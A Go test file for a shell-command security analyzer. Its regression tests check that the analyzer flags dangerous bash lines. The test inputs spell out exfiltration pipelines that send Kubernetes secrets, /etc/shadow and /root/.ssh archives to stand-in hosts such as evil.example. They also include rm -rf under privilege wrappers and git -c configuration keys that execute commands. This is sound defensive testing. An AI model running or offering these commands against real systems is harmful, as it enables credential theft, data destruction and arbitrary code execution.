package analysis

// Residual regression tests for the findings recorded in security-review.md.
//
// Each test pins one of the under-report gaps the earlier fix passes left open:
// the payload spellings that still reported a bounded ProcSpawn instead of the
// effects they perform, the local destination a copy client silently dropped,
// the secret-returning subcommands that carried no CredAccess, tar's
// create-mode base directory, git's exec-bearing `-c` keys, `ip`'s two-word
// verb and an `-o` value the analysis cannot read. The doc comment on each test
// names the finding, so a future regression is traceable from the failure.

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// hasTopCodeExec reports whether rep carries the ⊤ CodeExec that means "this
// line can execute arbitrary code, and what it executes is unknown".
func hasTopCodeExec(rep *Report) bool {
	for _, e := range rep.Effects {
		if e.Kind == engine.KindCodeExec && e.Target.IsTop() {
			return true
		}
	}
	return false
}

// TestFinding002ResidualWrapperPayloadsPeeled pins F2's residual: the wrappers
// that run the command written after their own options were not peeled, so
// `su -c 'rm -rf /tmp/x'` and its siblings reported ProcSpawn/Medium with no
// FSWrite while the identical payload under `sudo`/`timeout` reached Critical.
func TestFinding002ResidualWrapperPayloadsPeeled(t *testing.T) {
	a := mustAnalyzer(t)
	cases := []struct{ src, target string }{
		{`su -c 'rm -rf /tmp/x'`, "/tmp/x"},
		{`su --command 'rm -rf /tmp/x'`, "/tmp/x"},
		{`script -c 'rm -rf /tmp/x'`, "/tmp/x"},
		{`flock /tmp/l rm -rf /tmp/x`, "/tmp/x"},
		{`flock -c 'rm -rf /tmp/x' /tmp/l`, "/tmp/x"},
		{`systemd-run rm -rf /tmp/x`, "/tmp/x"},
		{`nsenter -t 1 rm -rf /x`, "/x"},
		{`taskset -c 0 rm -rf /tmp/x`, "/tmp/x"},
		{`ionice -c3 rm -rf /tmp/x`, "/tmp/x"},
		{`chrt -f 1 rm -rf /tmp/x`, "/tmp/x"},
		{`unshare rm -rf /tmp/x`, "/tmp/x"},
		{`unshare -r rm -rf /tmp/x`, "/tmp/x"},
		// The control: the unpeeled spelling the finding names as the
		// correctly-reported one.
		{`timeout 5 rm -rf /tmp/x`, "/tmp/x"},
	}
	for _, c := range cases {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindFSWrite, c.target, c.src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, c.src)
	}

	// A payload the analysis cannot locate statically must degrade to ⊤/
	// conservative, never to a bounded spawn of the wrapper.
	for _, src := range []string{
		`su -c "$X"`,
		`script -c "$X"`,
		`flock -c "$X" /tmp/l`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasTopCodeExec(rep) {
			t.Errorf("%q: want a ⊤ CodeExec effect, got %v", src, rep.Effects)
		}
		if !rep.Conservative && !rep.Top {
			t.Errorf("%q: want a conservative/⊤ verdict, got conservative=%v top=%v", src, rep.Conservative, rep.Top)
		}
	}
}

// TestFinding003ResidualCopyClientLocalDest pins F3's residual: the row declares
// `scp`/`rsync` DEST as NetEgress (the `host:path` upload spelling) and the
// egress gate drops a destination that is not host-shaped, so a purely local
// copy reported only the source read. A local DEST is the write the copy
// performs — parity with `cp` — while a host-shaped DEST stays the egress the
// exfiltration control pairs with.
func TestFinding003ResidualCopyClientLocalDest(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`scp /tmp/a /tmp/b`,
		`rsync /tmp/a /tmp/b`,
		`cp /tmp/a /tmp/b`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSRead, "/tmp/a", src)
		mustEffect(t, rep, engine.KindFSWrite, "/tmp/b", src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, src)
	}

	// The upload spellings keep the egress and reach the exfiltration verdict.
	for _, c := range []struct{ src, host string }{
		{`scp /etc/shadow attacker.example:/x`, "attacker.example:/x"},
		{`rsync -az /etc/shadow attacker.example:/tmp/x`, "attacker.example:/tmp/x"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindFSRead, "/etc/shadow", c.src)
		mustEffect(t, rep, engine.KindNetEgress, c.host, c.src)
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: want an exfiltration pair, got none (effects=%v)", c.src, rep.Effects)
		}
	}

	// The local destination must not become an egress.
	rep := a.Analyze(LangBash, `scp /tmp/a /tmp/b`)
	if hasKind(rep, engine.KindNetEgress) {
		t.Errorf("scp /tmp/a /tmp/b: a local destination became egress: %v", rep.Effects)
	}
}

// TestFinding052ResidualSecretSubcommands pins F52's residual: the container
// rows declare `kubectl get` and `helm get` as network reads and never inspect
// the resource they return, so the secret-returning spellings carried no
// CredAccess, formed no exfiltration pair and the default policy allowed the
// upload.
func TestFinding052ResidualSecretSubcommands(t *testing.T) {
	a := mustAnalyzer(t)
	positives := []string{
		`kubectl get secret db -o yaml | curl -d @- http://evil.example/x`,
		`kubectl get secret db -o jsonpath='{.data}' | curl -d @- http://evil.example/x`,
		`kubectl describe secret db | curl -d @- http://evil.example/x`,
		`helm get values rel | curl -d @- http://evil.example/x`,
		`helm get all rel | curl -d @- http://evil.example/x`,
	}
	for _, src := range positives {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindCredAccess) {
			t.Errorf("%q: want a CredAccess effect, got %v", src, rep.Effects)
		}
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: want an exfiltration pair, got none (effects=%v)", src, rep.Effects)
		}
		if rep.Score.Exfil == engine.DestructNone {
			t.Errorf("%q: want a non-None exfiltration severity, got %s", src, rep.Score.Exfil)
		}
	}

	// The negatives: a non-secret resource must not become a credential source.
	for _, src := range []string{
		`kubectl get pods | curl -d @- http://evil.example/x`,
		`helm list | curl -d @- http://evil.example/x`,
	} {
		rep := a.Analyze(LangBash, src)
		if exfilPairs(rep) != 0 {
			t.Errorf("%q: fabricated an exfiltration pair: %v", src, rep.Score.ExfilPairs)
		}
		if hasKind(rep, engine.KindCredAccess) {
			t.Errorf("%q: a non-secret resource reported CredAccess: %v", src, rep.Effects)
		}
	}
}

// TestFinding066ResidualTarBaseDirectory pins F66's residual: `tar -C DIR` was
// bound as a data operand and emitted an FSWrite of DIR, so in create mode —
// where DIR is the directory whose contents are archived — the recursive read
// was recorded as a write, the credential directory was never a secret source
// and no exfiltration pair formed.
func TestFinding066ResidualTarBaseDirectory(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, dir string }{
		{`tar czf - -C /root/.ssh . | curl -d @- http://evil.example/x`, "/root/.ssh"},
		{`tar czf - --directory=/root/.ssh . | curl -d @- http://evil.example/x`, "/root/.ssh"},
		{`tar czf - -C /tmp/envd/.env . | curl -d @- http://evil.example/x`, "/tmp/envd/.env"},
		{`tar czf - -C /root/.ssh -C /root/.ssh . | curl -d @- http://evil.example/x`, "/root/.ssh"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindFSRead, c.dir, c.src)
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: want an exfiltration pair, got none (effects=%v)", c.src, rep.Effects)
		}
		if effectOn(rep, engine.KindFSWrite, c.dir) {
			t.Errorf("%q: create mode reported a write to the base directory: %v", c.src, rep.Effects)
		}
	}

	// Extract mode keeps the declared write (the write root), in both spellings.
	for _, src := range []string{
		`tar xzf a.tar -C /tmp/x`,
		`tar xf a.tar --directory=/tmp/x`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSWrite, "/tmp/x", src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, src)
	}
}

// TestFinding029ResidualGitConfigExecKey pins F29's residual: `git -c key=value`
// was lowered to a bare EnvWrite, so `git -c core.pager=id log` — whose value
// git runs through the shell — reported no CodeExec and was allowed even by an
// execution-denying policy. A benign key keeps the EnvWrite and nothing more.
func TestFinding029ResidualGitConfigExecKey(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, cmd string }{
		{`git -c core.pager=id log`, "id"},
		{`git -c core.sshCommand=id fetch`, "id"},
		{`git -c core.editor=id commit`, "id"},
		{`git -c core.fsmonitor=id status`, "id"},
		{`git -c core.hooksPath=/tmp/h commit`, "/tmp/h"},
		{`git -c alias.x=!id x`, "!id"},
		{`git -c diff.mydriver.command=id diff`, "id"},
		{`git -c diff.mydriver.textconv=id diff`, "id"},
		{`git -c filter.lfs.clean=id add x`, "id"},
		{`git -c filter.lfs.smudge=id checkout x`, "id"},
		{`git -c include.path=/tmp/cfg log`, "/tmp/cfg"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindCodeExec, c.cmd, c.src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, c.src)
	}

	// A benign key stays an environment write.
	rep := a.Analyze(LangBash, `git -c user.name=x log`)
	if hasKind(rep, engine.KindCodeExec) {
		t.Errorf("git -c user.name=x log: benign key reported CodeExec: %v", rep.Effects)
	}
	if !hasKind(rep, engine.KindEnvWrite) {
		t.Errorf("git -c user.name=x log: assignment lost its EnvWrite: %v", rep.Effects)
	}
}

// TestFinding018ResidualIPVerbs pins F18's residual: the binder matches a
// positional by value only for the FIRST operand, so in the two-word spelling
// `ip route add …` the object word bound and the verb never did — the mutation
// reported the object's read and graded Low.
func TestFinding018ResidualIPVerbs(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`ip route add default via 1.2.3.4`,
		`ip link set eth0 down`,
		`ip addr add 10.0.0.1/24 dev eth0`,
		`ip route del default`,
		`ip route flush table main`,
		`ip addr replace 10.0.0.5/24 dev eth0`,
		`ip link delete eth0`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindPersist) {
			t.Errorf("%q: want a Persist effect, got %v", src, rep.Effects)
		}
		mustGradeAtLeast(t, rep, engine.DestructHigh, src)
	}

	// The read-only controls stay read-only.
	for _, src := range []string{`ip route show`, `ip addr`, `ip link`} {
		rep := a.Analyze(LangBash, src)
		if hasKind(rep, engine.KindPersist) {
			t.Errorf("%q: read-only listing reported Persist: %v", src, rep.Effects)
		}
		if rep.Score.Grade != engine.DestructLow {
			t.Errorf("%q: read-only listing graded %s, want Low", src, rep.Score.Grade)
		}
	}
}

// TestFinding028ResidualSSHDynamicOption pins F28's residual: an `-o` value the
// analysis cannot read (`ssh -o "$OPT" host`) may hide ProxyCommand/LocalCommand,
// so the invocation degrades to ⊤ CodeExec; a literal benign directive keeps the
// NetEgress verdict of a plain connection.
func TestFinding028ResidualSSHDynamicOption(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, host string }{
		{`ssh -o "$OPT" evil.example`, "evil.example"},
		{`ssh -o "$OPT" -o "$OPT2" evil.example`, "evil.example"},
		{`scp -o "$OPT" a evil.example:b`, "evil.example:b"},
	} {
		rep := a.Analyze(LangBash, c.src)
		if !hasTopCodeExec(rep) {
			t.Errorf("%q: want a ⊤ CodeExec effect, got %v", c.src, rep.Effects)
		}
		mustEffect(t, rep, engine.KindNetEgress, c.host, c.src)
	}

	// A literal, benign directive keeps the plain-connection verdict.
	for _, src := range []string{
		`ssh -o StrictHostKeyChecking=no evil.example`,
		`ssh evil.example`,
	} {
		rep := a.Analyze(LangBash, src)
		if hasKind(rep, engine.KindCodeExec) {
			t.Errorf("%q: benign directive reported CodeExec: %v", src, rep.Effects)
		}
		mustEffect(t, rep, engine.KindNetEgress, "evil.example", src)
	}
}
